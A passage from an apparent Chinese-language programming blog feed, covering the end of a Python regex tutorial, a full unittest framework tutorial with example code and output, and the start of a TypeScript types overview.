class="string">&quot;remove_this&quot;</span>, email)</span><br><span class="line"><span class="built_in">print</span>(email[:m.start()] + email[m.end():]) <span class="comment"># tony@tiger.net 根据匹配的位置切分email</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="re_basic-4"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">entry = <span class="string">&#x27;Ross McFluff: 834.345.1254 155 Elm Street&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.split(<span class="string">&quot;:? &quot;</span>, entry, <span class="number">3</span>))  <span class="comment"># [&#x27;Ross&#x27;, &#x27;McFluff&#x27;, &#x27;834.345.1254&#x27;, &#x27;155 Elm Street&#x27;]</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="re_basic-5"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">displaymatch</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;Match: %r, groups=%r&gt;&#x27;</span> % (<span class="keyword">match</span>.group(), <span class="keyword">match</span>.groups())</span><br><span class="line"></span><br><span class="line">valid = re.<span class="built_in">compile</span>(<span class="string">r&quot;^[a2-9tjqk]&#123;5&#125;$&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(displaymatch(valid.<span class="keyword">match</span>(<span class="string">&quot;akt5q&quot;</span>))) <span class="comment"># &lt;Match: &#x27;akt5q&#x27;, groups=()&gt;</span></span><br><span class="line"><span class="built_in">print</span>(displaymatch(valid.<span class="keyword">match</span>(<span class="string">&quot;akt&quot;</span>)))   <span class="comment"># None</span></span><br><span class="line"><span class="built_in">print</span>(displaymatch(valid.<span class="keyword">match</span>(<span class="string">&quot;727ak&quot;</span>))) <span class="comment"># &lt;Match: &#x27;727ak&#x27;, groups=()&gt;</span></span><br><span class="line"></span><br><span class="line">pair = re.<span class="built_in">compile</span>(<span class="string">r&quot;.*(.).*\1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(displaymatch(pair.<span class="keyword">match</span>(<span class="string">&quot;717ak&quot;</span>)),  <span class="comment"># &lt;Match: &#x27;717&#x27;, groups=(&#x27;7&#x27;,)&gt;</span></span><br><span class="line">      pair.<span class="keyword">match</span>(<span class="string">&quot;717ak&quot;</span>).group(<span class="number">1</span>))       <span class="comment"># 7</span></span><br><span class="line"><span class="built_in">print</span>(displaymatch(pair.<span class="keyword">match</span>(<span class="string">&quot;718ak&quot;</span>)))  <span class="comment"># None</span></span><br><span class="line"><span class="built_in">print</span>(displaymatch(pair.<span class="keyword">match</span>(<span class="string">&quot;354aa&quot;</span>)))  <span class="comment"># &lt;Match: &#x27;354aa&#x27;, groups=(&#x27;a&#x27;,)&gt;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="扩展模块"><a href="#扩展模块" class="headerlink" title="扩展模块"></a>扩展模块</h1><h2 id="systools"><a href="#systools" class="headerlink" title="systools"></a>systools</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> systools.system <span class="keyword">import</span> loop, timeout, timer</span><br><span class="line"><span class="meta">@timer</span></span><br><span class="line"><span class="meta">@loop(<span class="params">minutes=<span class="number">2</span></span>)</span></span><br><span class="line"><span class="meta">@timeout(<span class="params">hours=<span class="number">1</span></span>)</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ProgrammingLanguage</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>PythonStandardLibrary</tag>
      </tags>
  </entry>
  <entry>
    <title>unittest单元测试框架</title>
    <url>/ProgrammingLanguage/Python/Unittest.html</url>
    <content><![CDATA[<p>unittest(Unit testing framework)受到JUnit启发而设计，标准库原生支持。</p>
<span id="more"></span>

<h1 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">帮助信息</span><br><span class="line">  python -m unittest --help</span><br><span class="line"></span><br><span class="line">运行测试用例</span><br><span class="line">  python -m unittest -v test_module            - run tests from test_module with verbose output</span><br><span class="line">  python -m unittest test_module               - run tests from test_module</span><br><span class="line">  python -m unittest module.TestClass          - run tests from module.TestClass</span><br><span class="line">  python -m unittest module.Class.test_method  - run specified test method</span><br><span class="line">  python -m unittest path/to/test_file.py      - run tests from test_file.py</span><br><span class="line"></span><br><span class="line">运行特定项目的测试用例</span><br><span class="line">  python -m unittest discover -s project_directory -p &quot;*_test.py&quot;</span><br><span class="line">  python -m unittest discover project_directory &quot;*_test.py&quot;</span><br></pre></td></tr></table></figure>

<h1 id="测试用例（test-case）"><a href="#测试用例（test-case）" class="headerlink" title="测试用例（test case）"></a>测试用例（test case）</h1><ul>
<li>执行unittest.main()，运行测试用例</li>
<li>继承unittest.TestCase，创建测试用例</li>
<li>测试方法名必须前缀”test”</li>
<li>使用TestCase.assert*()进行测试</li>
</ul>
<div class="tabs" id="test_case"><ul class="nav-tabs"><li class="tab active"><a href="#test_case-1">app/widget.py</a></li><li class="tab"><a href="#test_case-2">tests/widget/test_widget.py</a></li></ul><div class="tab-content"><div class="tab-pane active" id="test_case-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Widget</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n__init__&quot;</span>)</span><br><span class="line">        self.name = name</span><br><span class="line">        self.x = self.y = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;size&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.x, self.y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">resize</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;resize&quot;</span>)</span><br><span class="line">        self.x, self.y = x, y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dispose</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;dispose&quot;</span>)</span><br><span class="line">        self.name = <span class="literal">None</span></span><br><span class="line">        self.x = self.y = <span class="number">0</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="test_case-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> app.widget <span class="keyword">import</span> Widget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setUpModule</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;setUpModule %s&quot;</span> % __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tearDownModule</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tearDownModule %s&quot;</span> % __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WidgetTestCase</span>(unittest.TestCase):</span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUpClass</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;setUpClass %s&quot;</span> % __name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tearDownClass</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;tearDownClass %s&quot;</span> % __name__)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUp</span>(<span class="params">self</span>):</span><br><span class="line">        self.widget = Widget(<span class="string">&#x27;The widget&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tearDown</span>(<span class="params">self</span>):</span><br><span class="line">        self.widget.dispose()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_default_widget_size</span>(<span class="params">self</span>):</span><br><span class="line">        self.assertEqual(self.widget.size(), (<span class="number">50</span>,<span class="number">50</span>),</span><br><span class="line">                         <span class="string">&#x27;incorrect default size&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_widget_resize</span>(<span class="params">self</span>):</span><br><span class="line">        self.widget.resize(<span class="number">100</span>,<span class="number">150</span>)</span><br><span class="line">        self.assertEqual(self.widget.size(), (<span class="number">100</span>,<span class="number">150</span>),</span><br><span class="line">                         <span class="string">&#x27;wrong size after resize&#x27;</span>)</span><br></pre></td></tr></table></figure></div></div></div>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 -m unittest -v tests\widget\test_widget.py</span><br><span class="line">setUpModule tests.widget.test_widget</span><br><span class="line">setUpClass tests.widget.test_widget</span><br><span class="line">test_default_widget_size (tests.widget.test_widget.WidgetTestCase) ...</span><br><span class="line">__init__</span><br><span class="line">size</span><br><span class="line">dispose</span><br><span class="line">ok</span><br><span class="line">test_widget_resize (tests.widget.test_widget.WidgetTestCase) ...</span><br><span class="line">__init__</span><br><span class="line">resize</span><br><span class="line">size</span><br><span class="line">dispose</span><br><span class="line">ok</span><br><span class="line">tearDownClass tests.widget.test_widget</span><br><span class="line">tearDownModule tests.widget.test_widget</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 2 tests in 0.003s</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<h1 id="测试治具（test-fixture）"><a href="#测试治具（test-fixture）" class="headerlink" title="测试治具（test fixture）"></a>测试治具（test fixture）</h1><ul>
<li>每个测试方法之前执行TestCase.setUp()，之后执行TestCase.tearDown()。<br>TestCase.setUp()执行测试对象的__init__()，在TestCase.tearDown()清理测试对象占用资源。</li>
<li>在运行单个类的测试之前执行TestCase.setUpClass()，之后执行TestCase.tearDown()，必须用@classmethod修饰。</li>
<li>在运行单个模块的测试之前执行TestCase.setUpModule()，之后执行TestCase.tearDown()，应实现为function。</li>
<li>只要setUp<em>执行成功，tearDown</em>一定会执行，和测试方法的执行结果无关。</li>
</ul>
<h1 id="测试套件（test-suite）"><a href="#测试套件（test-suite）" class="headerlink" title="测试套件（test suite）"></a>测试套件（test suite）</h1><p>测试用例的集合，一起执行。</p>
<div class="tabs" id="test_suite"><ul class="nav-tabs"><li class="tab active"><a href="#test_suite-1">tests/widget/test_widget_suite.py</a></li><li class="tab"><a href="#test_suite-2">tests/widget/test_widget.py</a></li><li class="tab"><a href="#test_suite-3">tests/widget/__init__.py</a></li></ul><div class="tab-content"><div class="tab-pane active" id="test_suite-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tests.widget.test_widget <span class="keyword">import</span> WidgetTestCase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">suite</span>():</span><br><span class="line">    suite = unittest.TestSuite()</span><br><span class="line">    suite.addTest(WidgetTestCase(<span class="string">&#x27;test_default_widget_size&#x27;</span>))</span><br><span class="line">    suite.addTest(WidgetTestCase(<span class="string">&#x27;test_widget_resize&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> suite</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    runner = unittest.TextTestRunner(verbosity=<span class="number">2</span>)</span><br><span class="line">    runner.run(suite())</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="test_suite-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_tests</span>(<span class="params">loader=<span class="literal">None</span>, tests=<span class="literal">None</span>, pattern=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> loader:</span><br><span class="line">        loader = unittest.TestLoader()</span><br><span class="line">    suite_list = [</span><br><span class="line">        loader.loadTestsFromTestCase(WidgetTestCase),</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> unittest.TestSuite(suite_list)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="test_suite-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tests.widget <span class="keyword">import</span> test_widget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_tests</span>():</span><br><span class="line">    <span class="keyword">return</span> unittest.TestSuite(</span><br><span class="line">        [</span><br><span class="line">            test_widget.load_tests(),</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    result = unittest.TextTestRunner(verbosity=<span class="number">2</span>).run(load_tests())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result.wasSuccessful():</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div></div></div>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 -m unittest tests\widget\test_widget_suite.py</span><br><span class="line">setUpModule tests.widget.test_widget</span><br><span class="line">setUpClass tests.widget.test_widget</span><br><span class="line"></span><br><span class="line">__init__</span><br><span class="line">size</span><br><span class="line">dispose</span><br><span class="line">.</span><br><span class="line">__init__</span><br><span class="line">resize</span><br><span class="line">size</span><br><span class="line">dispose</span><br><span class="line">.tearDownClass tests.widget.test_widget</span><br><span class="line">tearDownModule tests.widget.test_widget</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 2 tests in 0.003s</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">$ set PYTHONPATH=$PYTHONPATH;.</span><br><span class="line">$ python3 tests\widget\__init__.py</span><br><span class="line">test_default_widget_size (tests.widget.test_widget.WidgetTestCase) ...  ok</span><br><span class="line">test_widget_resize (tests.widget.test_widget.WidgetTestCase) ...  ok</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 2 tests in 0.003s</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<h1 id="测试执行器（test-runner）"><a href="#测试执行器（test-runner）" class="headerlink" title="测试执行器（test runner）"></a>测试执行器（test runner）</h1><p>编排测试用例的执行过程，并反馈结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">unittest</span>.TextTestRunner(stream=<span class="literal">None</span>, descriptions=<span class="literal">True</span>, verbosity=<span class="number">1</span>, </span><br><span class="line">                              failfast=<span class="literal">False</span>, buffer=<span class="literal">False</span>, resultclass=<span class="literal">None</span>, </span><br><span class="line">                              warnings=<span class="literal">None</span>, *, tb_locals=<span class="literal">False</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">test</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">unittest.main(module=<span class="string">&#x27;__main__&#x27;</span>, defaultTest=<span class="literal">None</span>, argv=<span class="literal">None</span>, testRunner=<span class="literal">None</span>, </span><br><span class="line">              testLoader=unittest.defaultTestLoader, exit=<span class="literal">True</span>, verbosity=<span class="number">1</span>,</span><br><span class="line">              failfast=<span class="literal">None</span>, catchbreak=<span class="literal">None</span>, buffer=<span class="literal">None</span>, warnings=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">python -m unittest ...</span><br></pre></td></tr></table></figure>

<h1 id="兼容旧代码"><a href="#兼容旧代码" class="headerlink" title="兼容旧代码"></a>兼容旧代码</h1><p><code>class unittest.FunctionTestCase(testFunc, setUp=None, tearDown=None, description=None)</code></p>
<div class="tabs" id="test_old_code"><ul class="nav-tabs"><li class="tab active"><a href="#test_old_code-1">app/widget_func.py</a></li><li class="tab"><a href="#test_old_code-2">test/widget_func/test_widget_func.py</a></li></ul><div class="tab-content"><div class="tab-pane active" id="test_old_code-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">WIDGET_NAME = <span class="literal">None</span></span><br><span class="line">WIDGET_X = <span class="number">50</span></span><br><span class="line">WIDGET_Y = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> WIDGET_NAME</span><br><span class="line">    WIDGET_NAME = name</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\ninit <span class="subst">&#123;WIDGET_NAME&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">size</span>():</span><br><span class="line">    <span class="keyword">global</span> WIDGET_X, WIDGET_Y</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;size (<span class="subst">&#123;WIDGET_X&#125;</span>, <span class="subst">&#123;WIDGET_Y&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> WIDGET_X, WIDGET_Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resize</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">global</span> WIDGET_X, WIDGET_Y</span><br><span class="line">    WIDGET_X, WIDGET_Y = x, y</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;resize (<span class="subst">&#123;WIDGET_X&#125;</span>, <span class="subst">&#123;WIDGET_Y&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dispose</span>():</span><br><span class="line">    <span class="keyword">global</span> WIDGET_NAME, WIDGET_X, WIDGET_Y</span><br><span class="line">    WIDGET_NAME = <span class="literal">None</span></span><br><span class="line">    WIDGET_X = WIDGET_Y = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;dispose&quot;</span>)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="test_old_code-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> widget_func <span class="keyword">as</span> Widget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    Widget.init(<span class="string">&#x27;The widget&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    Widget.dispose()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">default_widget_size</span>():</span><br><span class="line">    <span class="keyword">assert</span> Widget.size() == (<span class="number">50</span>, <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">widget_resize</span>():</span><br><span class="line">    Widget.resize(<span class="number">100</span>, <span class="number">150</span>)</span><br><span class="line">    <span class="keyword">assert</span> Widget.size() == (<span class="number">100</span>, <span class="number">150</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_func1 = unittest.FunctionTestCase(default_widget_size, setUp=init, tearDown=clean)</span><br><span class="line">test_func2 = unittest.FunctionTestCase(widget_resize)</span><br><span class="line"></span><br><span class="line">runner = unittest.TextTestRunner()</span><br><span class="line">runner.run(test_func1)</span><br><span class="line">runner.run(test_func2)</span><br></pre></td></tr></table></figure></div></div></div>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 -m unittest tests\widget_func\test_widget_func.py</span><br><span class="line"></span><br><span class="line">init The widget</span><br><span class="line">size (50, 50)</span><br><span class="line">dispose</span><br><span class="line">.</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 1 test in 0.001s</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line">resize (100, 150)</span><br><span class="line">size (100, 150)</span><br><span class="line">.</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 1 test in 0.000s</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 0 tests in 0.000s</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<h1 id="忽略测试用例与反转结果"><a href="#忽略测试用例与反转结果" class="headerlink" title="忽略测试用例与反转结果"></a>忽略测试用例与反转结果</h1><ul>
<li>@unittest.skip忽略某些测试用例；</li>
<li>@unittest.expectedFailure期望执行结果是失败的。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SkipTestCase</span>(unittest.TestCase):</span><br><span class="line"></span><br><span class="line"><span class="meta">    @unittest.skip(<span class="params"><span class="string">&quot;demonstrating skipping&quot;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_nothing</span>(<span class="params">self</span>):</span><br><span class="line">        self.fail(<span class="string">&quot;shouldn&#x27;t happen&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @unittest.skipUnless(<span class="params">sys.platform.startswith(<span class="params"><span class="string">&quot;win&quot;</span></span>), <span class="string">&quot;requires Windows&quot;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_windows_support</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_maybe_skipped</span>(<span class="params">self</span>):</span><br><span class="line">        self.skipTest(<span class="string">&quot;external resource not available&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @unittest.expectedFailure</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_fail</span>(<span class="params">self</span>):</span><br><span class="line">        self.assertEqual(<span class="number">1</span>, <span class="number">1</span>, <span class="string">&quot;broken&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 -m unittest -v tests\test_skip_expected.py</span><br><span class="line">test_fail (tests.test_skip_expected.SkipTestCase) ... unexpected success</span><br><span class="line">test_maybe_skipped (tests.test_skip_expected.SkipTestCase) ... skipped &#x27;external resource not available&#x27;</span><br><span class="line">test_nothing (tests.test_skip_expected.SkipTestCase) ... skipped &#x27;demonstrating skipping&#x27;</span><br><span class="line">test_windows_support (tests.test_skip_expected.SkipTestCase) ... ok</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 4 tests in 0.001s</span><br><span class="line"></span><br><span class="line">FAILED (skipped=2, unexpected successes=1)</span><br></pre></td></tr></table></figure>

<h1 id="利用子测试区分迭代"><a href="#利用子测试区分迭代" class="headerlink" title="利用子测试区分迭代"></a>利用子测试区分迭代</h1><ul>
<li>TestCase.subTest()后不会因结果失败而终止迭代，且失败时可显示subTest的参数。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NumbersTest</span>(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_even</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Test that numbers between 0 and 5 are all even.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">6</span>):</span><br><span class="line">            <span class="keyword">with</span> self.subTest(i=i):</span><br><span class="line">                self.assertEqual(i % <span class="number">2</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h1 id="异步测试"><a href="#异步测试" class="headerlink" title="异步测试"></a>异步测试</h1><ul>
<li>unittest.IsolatedAsyncioTestCase支持协程作为测试函数。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> IsolatedAsyncioTestCase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>(<span class="title class_ inherited__">IsolatedAsyncioTestCase</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUp</span>(<span class="params">self</span>):</span><br><span class="line">        events.append(<span class="string">&quot;setUp&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">asyncSetUp</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#self._async_connection = await AsyncConnection()</span></span><br><span class="line">        events.append(<span class="string">&quot;asyncSetUp&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">test_response</span>(<span class="params">self</span>):</span><br><span class="line">        events.append(<span class="string">&quot;test_response&quot;</span>)</span><br><span class="line">        <span class="comment">#rsp.status_code = await self._async_connection.get(&quot;https://example.com&quot;)</span></span><br><span class="line">        <span class="comment">#self.assertEqual(rsp.status_code, 200)</span></span><br><span class="line">        self.addAsyncCleanup(self.on_cleanup)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tearDown</span>(<span class="params">self</span>):</span><br><span class="line">        events.append(<span class="string">&quot;tearDown&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">asyncTearDown</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#await self._async_connection.close()</span></span><br><span class="line">        events.append(<span class="string">&quot;asyncTearDown&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">on_cleanup</span>(<span class="params">self</span>):</span><br><span class="line">        events.append(<span class="string">&quot;cleanup&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;events&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    unittest.main(argv=[<span class="number">123</span>], exit=<span class="literal">True</span>, verbosity=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3.exe -m unittest -v tests\test_asyncio.py</span><br><span class="line">test_response (tests.test_asyncio.Test) ... [&#x27;setUp&#x27;, &#x27;asyncSetUp&#x27;, &#x27;test_response&#x27;, &#x27;asyncTearDown&#x27;, &#x27;tearDown&#x27;, &#x27;cleanup&#x27;]</span><br><span class="line">ok</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Ran 1 test in 0.012s</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://docs.python.org/3/library/unittest.html">unittest — Unit testing framework</a><br><a href="https://github.com/imssyang/python3">github: python3&#x2F;sample&#x2F;_unittest</a></p>
]]></content>
      <categories>
        <category>ProgrammingLanguage</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>unittest</tag>
      </tags>
  </entry>
  <entry>
    <title>TypeScript基础</title>
    <url>/ProgrammingLanguage/TypeScript/Basic.html</url>
    <content><![CDATA[<p>TypeScript的目标是成为JavaScript的静态类型检查器，即在运行JavaScript之前确保程序的类型是正确的。</p>
<span id="more"></span>

<h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><ul>
<li>常用类型，可以通过<code>typeof</code>判断值的类型，例如<code>(typeof obj === &quot;object&quot;)</code><ul>
<li>基本类型（primitive）<ul>
<li>null (typeof null由于历史原因等于 typeof object)</li>
<li>undefined</li>
<li>string</li>
<li>number</li>
<li>bigint</li>
<li>boolean</li>
<li>symbol</li>
</ul>
</li>
<li>扩展类型<ul>
<li>void 表示函数没有返回值，例如 <code>function f() &#123; return; &#125;</code></li>
<li>object 表示非primitive值，不同于<strong>全局类型Object</strong></li>
<li>Function 全局类型，描述类似<code>bind, call, apply</code>的属性</li>
</ul>
</li>
<li>特殊类型：<ul>
<li>any 用在不希望出现类型检查错误的地方，编译器无法推断类型时也会默认any</li>
<li>unknown 类似any，但对此类型的值做任何操作都是非法的</li>
<li>never 用于表示union类型在选择逻辑中已经收窄（narrowing）到空的状态<ul>
<li>never类型可以赋值给任何类型，但never类型不接受任何类型赋值给它</li>
</ul>
</li>
</ul>
</li>
<li>泛型类型<ul>
<li>Array<number>: [1, 2, 3]</li>
<li>ReadonlyArray<number>或<code>readonly number[]</code></li>
